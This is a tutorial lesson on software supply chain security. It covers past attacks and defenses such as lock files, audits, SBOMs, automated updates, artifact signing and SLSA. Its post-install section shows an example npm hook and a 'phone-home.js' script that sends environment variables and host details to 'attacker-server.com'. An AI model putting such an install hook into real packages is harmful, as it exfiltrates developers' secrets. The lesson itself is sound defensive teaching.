# Lesson 18: Supply Chain Security -- Knowing What Is in Your Food

Your application depends on hundreds of packages you did not write. A typical
Node.js project pulls in 500-1,500 transitive dependencies. A Go project might
have 50-200. Each of those dependencies was written by someone you have never
met, maintained on infrastructure you do not control, and distributed through
registries with varying levels of security.

Supply chain security is like food safety. Your restaurant (application) uses
ingredients (dependencies) from dozens of suppliers (package authors). One
contaminated ingredient can poison every customer who eats at your restaurant.
You need to know where every ingredient came from (SBOM), verify it is genuine
and uncontaminated (signing, scanning), test it before serving (auditing), and
have a recall plan when something goes wrong (incident response).

The scary part: unlike food safety, where you can taste-test a suspicious
ingredient, malicious code in a dependency can be invisible -- executing silently
at install time or deep in a code path you never directly call.

---

## The Problem: Your App Is Mostly Other People's Code

```
Your Code:     ~5,000 lines      (you wrote this, you audit this)
Dependencies:  ~500,000 lines    (strangers wrote this, who audits it?)

Typical Node.js project:
  package.json lists 30 direct dependencies
  node_modules contains 800+ packages
  You explicitly chose 30. The other 770 came along for the ride.

Typical Go project:
  go.mod lists 20 direct dependencies
  go.sum contains 80+ modules
  Each of those modules has its own dependencies.
```

Every one of those packages is a trust decision. You are trusting that the
author is competent, honest, and that their account has not been compromised.
You are trusting that the registry delivered the package they actually published.
You are trusting that no one tampered with the code between the author's machine
and yours.

---

## Famous Attacks: How the Supply Chain Breaks

### event-stream (npm, 2018)

A popular npm package (`event-stream`, 2 million weekly downloads) was
maintained by a single developer who had lost interest. A helpful stranger
offered to take over maintenance. The original author handed over publishing
rights.

The new maintainer added a dependency called `flatmap-stream` that contained
obfuscated code targeting the Copay Bitcoin wallet. The malicious code activated
only when running inside the Copay app, stealing cryptocurrency wallet keys.

```
Timeline:
  1. Attacker offers to maintain abandoned popular package
  2. Original author transfers npm publish access
  3. Attacker adds a malicious dependency
  4. 2 million downloads/week distributes the malware
  5. Targeted payload activates only in specific application
  6. Weeks pass before anyone notices
```

The lesson: maintainer trust is a single point of failure. A package is only as
secure as the person who can publish new versions.

### SolarWinds (2020)

Attackers compromised SolarWinds' build system and injected a backdoor into the
Orion network monitoring software. The compromised update was digitally signed by
SolarWinds (because the build system itself was compromised) and distributed to
18,000 organizations including US government agencies and Fortune 500 companies.

```
SolarWinds Build Pipeline:
  Source Code (clean) -> Build System (COMPROMISED) -> Signed Binary (backdoored)
                                                       |
                                                       v
                                                  18,000 customers
                                                  install trusted update
```

The lesson: signing only proves who built it, not that the build system was
clean. The entire build pipeline is attack surface.

### ua-parser-js (npm, 2021)

The maintainer's npm account was compromised. Attackers published three
malicious versions (0.7.29, 0.8.0, 1.0.0) that installed crypto miners and
credential stealers on Linux and Windows. The package had 7 million weekly
downloads.

```
Attack flow:
  1. Attacker compromises maintainer's npm account
  2. Publishes malicious versions
  3. post-install script downloads and executes malware
  4. 7 million downloads/week means rapid distribution
  5. Anyone running npm install or npm ci gets infected
```

### colors and faker (npm, 2022)

The maintainer of `colors` (20 million weekly downloads) and `faker` (2.5
million weekly downloads) deliberately sabotaged his own packages by adding
infinite loops, corrupting output with garbage text. This was a protest, not
a traditional attack, but it demonstrated the fragility: one person can break
thousands of applications.

### Dependency Confusion (2021)

Security researcher Alex Birsan discovered that many companies use private
package registries for internal packages. If an attacker publishes a package
with the same name to the public npm/PyPI registry with a higher version number,
many build systems fetch the public (malicious) version instead of the private
(legitimate) one.

```
Company internal registry:
  @company/auth-utils   version 1.2.0

Public npm registry:
  @company/auth-utils   version 99.0.0  (attacker-controlled)

Build system: "I see version 99.0.0 on npm, that's newer than 1.2.0, I'll use that!"
Result: Malicious code runs inside the company's build pipeline
```

Birsan used this technique to execute code inside Apple, Microsoft, Tesla,
Uber, and dozens of other companies.

---

## How Attacks Work: The Mechanics

### Typosquatting

Attackers publish packages with names similar to popular ones, hoping developers
make a typo.

```
Legitimate:     lodash          express         typescript
Typosquat:      lodahs          expresss        typscript
                l0dash          expres          tyepscript
                lodash-utils    express-core    typescipt

# Real examples that have been caught:
# crossenv (typosquat of cross-env)
# babelcli (typosquat of babel-cli)
# eslint-scope was compromised (not a typosquat, account compromise)
```

### Malicious Post-Install Scripts

npm, pip, and other package managers support scripts that run during
installation -- before your code ever imports the package.

```json
{
  "name": "totally-legit-package",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node collect-env-vars.js",
    "postinstall": "node phone-home.js"
  }
}
```

```javascript
// phone-home.js (what a malicious post-install script might do)
// THIS IS AN EXAMPLE OF MALICIOUS CODE -- DO NOT RUN
const https = require('https');
const os = require('os');

const data = JSON.stringify({
  hostname: os.hostname(),
  user: os.userInfo().username,
  env: process.env,
  cwd: process.cwd(),
});

const req = https.request({
  hostname: 'attacker-server.com',
  path: '/collect',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
});
req.write(data);
req.end();
```

This script runs with your user's permissions during `npm install`. It can read
environment variables (which often contain secrets), access the filesystem, and
exfiltrate data. By the time your application code runs, the damage is done.

---

## Defenses

### Lock Files: Your First Line of Defense

Lock files record the exact version and integrity hash of every dependency.
Without them, `npm install` might fetch different versions each time, including
a newly published malicious version.

```
package-lock.json (npm):
  Records exact version + integrity hash (SHA-512) of every package
  npm ci installs exactly what's in the lock file (reproducible)
  npm install might update the lock file (non-reproducible)

go.sum (Go):
  Records SHA-256 hash of every module's source code
  go mod verify checks hashes against go.sum

Cargo.lock (Rust):
  Records exact version and checksum of every crate
  cargo build uses locked versions
```

**Critical practice:** Always commit lock files to git. Always use `npm ci`
(not `npm install`) in CI/CD pipelines. The difference:

```bash
# BAD in CI: might install different versions than developers tested
npm install

# GOOD in CI: installs exactly what's in the lock file
npm ci

# Go: verify all downloaded modules match go.sum
go mod verify
```

### Dependency Auditing

Regularly scan your dependencies for known vulnerabilities.

```bash
# npm: built-in audit
$ npm audit

# found 3 vulnerabilities (1 moderate, 1 high, 1 critical)
#
# express  <4.17.3    Severity: high
#   Open Redirect
#   fix available via `npm audit fix`
#
# node-fetch  <2.6.7  Severity: critical
#   Exposure of Sensitive Information
#   fix available via `npm audit fix --force`

# Fix automatically (non-breaking changes)
npm audit fix

# Go: verify module checksums
$ go mod verify
all modules verified

# Go: check for known vulnerabilities (govulncheck)
$ go install golang.org/x/vuln/cmd/govulncheck@latest
$ govulncheck ./...
```

```bash
# Rust: cargo-audit
$ cargo install cargo-audit
$ cargo audit

# Scanning Cargo.lock for vulnerabilities...
# ID       Crate    Advisory
# RUSTSEC-2023-0001  openssl  Vulnerability in...
```

### SBOMs (Software Bill of Materials)

An SBOM is a complete inventory of every component in your software. Think of it
like a nutritional label -- it lists every ingredient so you (and your customers)
know exactly what is inside.

When a new vulnerability is disclosed (like Log4Shell), the first question is:
"Are we affected?" Without an SBOM, you have to manually investigate every
service. With an SBOM, you search the inventory in seconds.

```bash
# Generate SBOM with syft (Anchore)
$ syft myapp:latest -o spdx-json > sbom.json

# Generate SBOM for a directory
$ syft dir:. -o cyclonedx-json > sbom.json

# Search for a specific package across all SBOMs
$ cat sbom.json | jq '.packages[] | select(.name == "log4j-core")'
```

```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.4",
  "components": [
    {
      "type": "library",
      "name": "express",
      "version": "4.18.2",
      "purl": "pkg:npm/express@4.18.2"
    },
    {
      "type": "library",
      "name": "pg",
      "version": "8.11.3",
      "purl": "pkg:npm/pg@8.11.3"
    }
  ]
}
```

### Automated Dependency Updates: Dependabot and Renovate

Manual dependency updates do not happen. People forget, deprioritize, and
accumulate months of unpatched vulnerabilities. Automate it.

**Dependabot configuration:**

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "dependencies"
      - "security"
    groups:
      minor-and-patch:
        update-types:
          - "minor"
          - "patch"

  - package-ecosystem: "gomod"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 5

  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"

  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

This configuration checks npm, Go modules, Docker base images, and GitHub
Actions for updates every week. Minor and patch updates are grouped into a
single PR to reduce noise. Security updates are opened immediately.

**Renovate** is a more flexible alternative with auto-merge capabilities:

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": [
    "config:recommended",
    ":automergeMinor",
    ":automergeDigest",
    "security:openPullRequestsImmediately"
  ],
  "packageRules": [
    {
      "matchUpdateTypes": ["patch", "minor"],
      "matchCurrentVersion": "!/^0/",
      "automerge": true,
      "automergeType": "pr"
    },
    {
      "matchUpdateTypes": ["major"],
      "automerge": false,
      "labels": ["breaking-change"]
    }
  ]
}
```

Renovate auto-merges minor and patch updates for stable (1.x+) packages if
tests pass. Major updates require manual review. Security updates skip the
queue and create PRs immediately.

### Signing Artifacts with Sigstore/cosign

Signing proves that a container image or package was built by who it claims to
be, from the source code it claims to contain.

```bash
# Install cosign
go install github.com/sigstore/cosign/v2/cmd/cosign@latest

# Sign a container image (keyless, uses OIDC identity)
cosign sign myregistry.com/myapp:v1.2.3

# Verify a signature
cosign verify myregistry.com/myapp:v1.2.3

# Sign with a key pair (for air-gapped environments)
cosign generate-key-pair
cosign sign --key cosign.key myregistry.com/myapp:v1.2.3
cosign verify --key cosign.pub myregistry.com/myapp:v1.2.3
```

In a CI pipeline, verify images before deploying:

```yaml
# In Kubernetes, use a policy to enforce signed images
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signatures
spec:
  validationFailureAction: Enforce
  rules:
    - name: check-signature
      match:
        any:
          - resources:
              kinds:
                - Pod
      verifyImages:
        - imageReferences:
            - "myregistry.com/myapp:*"
          attestors:
            - entries:
                - keyless:
                    subject: "build@mycompany.com"
                    issuer: "https://accounts.google.com"
```

This Kyverno policy rejects any pod using a `myapp` image that was not signed
by the build pipeline's identity. Even if an attacker pushes a malicious image
to your registry, it will not have a valid signature and will be rejected at
admission time.

### Private Registries

Host your own package registry and control what packages are available.

```
Public Registry (npm, PyPI):
  Anyone can publish anything
  Packages available immediately
  Typosquatting, dependency confusion possible

Private Registry (Artifactory, Nexus, GitHub Packages):
  Only approved packages available
  Proxy public registry with allow-list
  Scan packages before making them available
  Prevent dependency confusion (internal names reserved)
```

```
# npm: configure to use private registry
# .npmrc
registry=https://npm.mycompany.com/
@mycompany:registry=https://npm.mycompany.com/

# This prevents dependency confusion:
# @mycompany/* always resolves to private registry
# other packages resolve to private registry (which proxies npmjs.com)
```

### Vendoring Dependencies

Vendoring means copying all dependencies into your repository. You control
every byte of code that runs in production.

```bash
# Go: vendor all dependencies
go mod vendor

# Your repo now contains:
# vendor/
#   github.com/lib/pq/
#   github.com/gorilla/mux/
#   ... every dependency, in full source

# Build using vendored deps
go build -mod=vendor ./...
```

Vendoring trades disk space for certainty. The registry could go down, a package
could be deleted, a maintainer could publish a malicious update -- your vendored
copy is unaffected. The tradeoff: larger repository, more effort to update.

---

## SLSA Framework (Supply-chain Levels for Software Artifacts)

SLSA (pronounced "salsa") is a framework that defines levels of supply chain
security maturity. Think of it like food safety grades for restaurants -- Level 1
means basic hygiene, Level 4 means hospital-grade.

```
Level 1: Documentation
  - Build process is documented
  - Provenance (build metadata) is available
  - "We know how this was built"

Level 2: Tamper Resistance
  - Build runs on a hosted service (not a developer laptop)
  - Provenance is signed
  - "We can verify how this was built"

Level 3: Hardened Builds
  - Build runs in an isolated, ephemeral environment
  - Source and build platforms are audited
  - Provenance is non-forgeable
  - "No one could have tampered with the build"

Level 4: Dependencies Verified
  - All dependencies also meet SLSA Level 4
  - Full dependency tree is verified
  - "Everything in this artifact is verified"
```

Most organizations should aim for SLSA Level 2-3. Level 4 is the aspiration
but requires the entire ecosystem to participate.

### GitHub Actions and SLSA

GitHub Actions can generate SLSA provenance automatically:

```yaml
name: Build and Publish
on:
  push:
    tags:
      - 'v*'

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
      attestations: write
      packages: write

    steps:
      - uses: actions/checkout@v4

      - name: Build Docker image
        run: docker build -t myregistry.com/myapp:${{ github.ref_name }} .

      - name: Push image
        run: docker push myregistry.com/myapp:${{ github.ref_name }}

      - name: Generate SLSA provenance
        uses: actions/attest-build-provenance@v2
        with:
          subject-name: myregistry.com/myapp
          subject-digest: ${{ steps.push.outputs.digest }}
```

The provenance record answers: Who built this? What source code was used? What
build system ran? Were the build steps tampered with? This record is signed and
can be verified before deployment.

---

## Practical Workflow: Securing Your Supply Chain

Here is a complete workflow that integrates the defenses we covered.

### Step 1: Audit Current Dependencies

```bash
# TypeScript/Node.js project
npm audit
npx depcheck

# Go project
go mod verify
govulncheck ./...
go mod tidy

# Rust project
cargo audit
cargo deny check
```

### Step 2: Generate an SBOM

```bash
syft dir:. -o cyclonedx-json > sbom.json
```

### Step 3: Set Up Automated Updates

Create `.github/dependabot.yml` as shown earlier.

### Step 4: Add Security Scanning to CI

```yaml
name: Security Checks
on: [pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: npm audit
        run: npm audit --audit-level=high

      - name: Trivy filesystem scan
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: "fs"
          scan-ref: "."
          severity: "HIGH,CRITICAL"
          exit-code: "1"

  image-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build image
        run: docker build -t myapp:pr-${{ github.event.number }} .

      - name: Trivy image scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: "myapp:pr-${{ github.event.number }}"
          severity: "HIGH,CRITICAL"
          exit-code: "1"
```

### Step 5: Verify at Deploy Time

```go
package main

import (
    "crypto/sha256"
    "encoding/hex"
    "fmt"
    "os"
)

type DependencyManifest struct {
    Name     string
    Version  string
    Expected string
}

func verifyBinary(path string, expectedHash string) error {
    data, err := os.ReadFile(path)
    if err != nil {
        return fmt.Errorf("reading file: %w", err)
    }

    hash := sha256.Sum256(data)
    actual := hex.EncodeToString(hash[:])

    if actual != expectedHash {
        return fmt.Errorf(
            "hash mismatch for %s: expected %s, got %s",
            path, expectedHash, actual)
    }

    return nil
}

func main() {
    err := verifyBinary("/app/server",
        "a1b2c3d4e5f6...expected-sha256-hash...")
    if err != nil {
        fmt.Fprintf(os.Stderr, "verification failed: %v\n", err)
        os.Exit(1)
    }
    fmt.Println("Binary verified, starting application")
}
```

```typescript
import { createHash } from "node:crypto";
import { readFile } from "node:fs/promises";

async function verifyFile(
  path: string,
  expectedHash: string
): Promise<boolean> {
  const data = await readFile(path);
  const hash = createHash("sha256").update(data).digest("hex");

  if (hash !== expectedHash) {
    console.error(
      `Hash mismatch for ${path}: expected ${expectedHash}, got ${hash}`
    );
    return false;
  }

  return true;
}

async function verifyDependencies(): Promise<void> {
  const manifest: Record<string, string> = {
    "./node_modules/express/index.js": "abc123...",
    "./node_modules/pg/lib/index.js": "def456...",
  };

  for (const [file, expected] of Object.entries(manifest)) {
    const valid = await verifyFile(file, expected);
    if (!valid) {
      process.exit(1);
    }
  }

  console.log("All dependencies verified");
}

verifyDependencies();
```

---

## Defending Against Specific Attacks

### Against Typosquatting

```bash
# Use exact package names, never type from memory
# Double-check before npm install:
npm info <package-name>

# Look at:
#   - Download count (popular packages have millions)
#   - Published date (old = more likely legitimate)
#   - Author/maintainers
#   - Repository URL (matches the real project?)
```

### Against Dependency Confusion

```
# .npmrc: scope your private packages
@mycompany:registry=https://npm.mycompany.com/

# Claim your scope on public npm (even if you don't use it)
# This prevents attackers from registering @mycompany on npmjs.com
```

For Go, dependency confusion is harder because Go uses URLs as import paths.
`github.com/mycompany/internal-pkg` resolves to GitHub, not a public module
proxy. But if using a private Git server, configure GONOSUMDB and GONOSUMCHECK:

```bash
export GONOSUMDB="git.mycompany.com/*"
export GONOPROXY="git.mycompany.com/*"
export GOPRIVATE="git.mycompany.com/*"
```

### Against Malicious Post-Install Scripts

```bash
# npm: ignore scripts during install (safer but may break some packages)
npm install --ignore-scripts

# Then explicitly run scripts for packages you trust:
npm rebuild

# Or use a package that audits install scripts:
npx can-i-ignore-scripts
```

---

## Real-World Timeline: Log4Shell (December 2021)

The Log4Shell vulnerability (CVE-2021-44228) affected Log4j, a Java logging
library used in millions of applications. It allowed remote code execution
through a simple log message.

```
Dec 9:   Vulnerability disclosed publicly
Dec 10:  Mass scanning begins (attackers searching for vulnerable systems)
Dec 11:  First worm-like exploitation in the wild
Dec 12:  Organizations scramble to find all instances of Log4j

Question: "Is Log4j anywhere in our infrastructure?"

Without SBOM:
  - Manually check every service
  - grep through Dockerfiles, pom.xml, build.gradle
  - Check transitive dependencies (Log4j might be pulled in by another library)
  - Days of investigation

With SBOM:
  - Search: cat sbom.json | jq '.components[] | select(.name == "log4j-core")'
  - Complete answer in seconds
  - Immediately know which services to patch
```

This is the strongest argument for SBOMs: when a zero-day drops and the internet
is on fire, knowing what is in your software is the difference between patching
in hours and scrambling for days.

---

## Supply Chain Security Maturity Model

```
Level 0: No awareness
  - npm install whatever
  - No lock files committed
  - No vulnerability scanning
  - "It works, ship it"

Level 1: Basic hygiene
  - Lock files committed and used in CI
  - npm audit / govulncheck run occasionally
  - Dependabot or Renovate configured
  - .npmrc scopes private packages

Level 2: Active defense
  - CI fails on critical vulnerabilities
  - Container images scanned before deployment
  - SBOMs generated for all artifacts
  - Private registry with approved packages

Level 3: Verified supply chain
  - Artifacts signed with cosign/Sigstore
  - Kubernetes admission policies enforce signed images
  - SLSA Level 2-3 provenance
  - Vendor critical dependencies
  - Post-install scripts audited or disabled

Level 4: Full chain verification
  - All dependencies meet SLSA Level 3+
  - Reproducible builds
  - Full provenance chain from source to production
  - Continuous monitoring of dependency health
```

Most teams should be at Level 2 minimum. Level 3 is achievable with moderate
effort. Level 4 is aspirational.

---

## Hands-On Exercises

1. **npm audit your project**: Run `npm audit` on a real project. How many
   vulnerabilities exist? Can they be fixed with `npm audit fix`? For those that
   cannot, what is the upgrade path?

2. **go mod verify**: Run `go mod verify` on a Go project. Understand what it
   checks (SHA-256 of module source against go.sum).

3. **Generate an SBOM**: Install syft and generate an SBOM for a Docker image
   you have built. Search it for a specific package. How many transitive
   dependencies does your application have?

4. **Dependabot setup**: Add a `.github/dependabot.yml` to a repository. Create
   a PR, merge it, and wait for the first dependency update PR to appear.

5. **Lock file experiment**: In a test project, delete `package-lock.json` and
   run `npm install` twice on different days. Compare the resulting lock files.
   Are they identical? This demonstrates why lock files must be committed.

6. **Typosquatting awareness**: Go to npmjs.com and search for misspellings of
   popular packages (e.g., "expresss", "loadsh"). How many suspicious packages
   exist? Look at their download counts, publish dates, and code.

---

## Key Takeaways

- Your application is only as secure as its weakest dependency.
- Lock files are non-negotiable. Commit them. Use `npm ci` in CI.
- Automate dependency updates with Dependabot or Renovate. Manual updates do not happen.
- Generate SBOMs so you can answer "are we affected?" in seconds when the next Log4Shell hits.
- Sign your artifacts. Verify signatures before deploying.
- Scope private packages to prevent dependency confusion.
- Audit post-install scripts. A malicious post-install script runs with your permissions before your code ever executes.
- Supply chain attacks target the trust relationships between developers, registries, and build systems. Every link in that chain is attack surface.
- The goal is not perfection -- it is making supply chain attacks more difficult and detecting them faster when they happen.
